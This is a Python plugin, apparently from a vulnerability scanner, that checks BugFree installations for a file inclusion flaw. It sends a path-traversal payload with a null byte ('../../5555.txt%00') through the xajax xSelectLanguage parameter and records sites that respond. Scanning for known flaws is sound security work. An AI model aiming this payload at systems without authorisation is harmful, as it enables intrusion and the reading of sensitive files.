#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2020-1-19"  # 插件编辑时间
        self.info['disclosure']='2013-11-30'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "BugFreeFileContains"  # 插件名称
        self.info['name'] ='BugFree文件包含' #漏洞名称
        self.info['affects'] = "BugFree"  # 漏洞组件
        self.info['desc_content'] = "BugFree文件包含漏洞，攻击者可以通过文件包含来读取系统敏感文件信息。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,UnixTimestamp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/bugfree/Login.php"
        payload_url = scheme + "://" + url +":"+ str(port)+ payload
        data = {
            'xajax': 'xSelectLanguage',
            'xajaxargs[]': '../../5555.txt%00',
            'xajaxr': '1377604187765'
        }
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        resp = s.post(payload_url,headers=headers,data=data, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if con.find("System")!=-1 and con.find("Build Date")!=-1:
            Medusa = "{}存在BugFree文件包含漏洞\r\n 验证数据:\r\nUrl:{}\r\n返回内容:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名